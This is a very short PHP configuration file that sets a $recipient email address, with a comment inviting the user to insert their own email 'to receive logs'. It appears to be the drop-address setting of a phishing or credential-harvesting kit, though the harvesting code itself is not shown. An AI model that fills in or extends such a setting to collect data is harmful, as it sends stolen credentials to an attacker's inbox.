<?php

  $recipient = "igeneraltradingllc@gmail.com";  // Just put your email between quotes to receive logs
  
?>
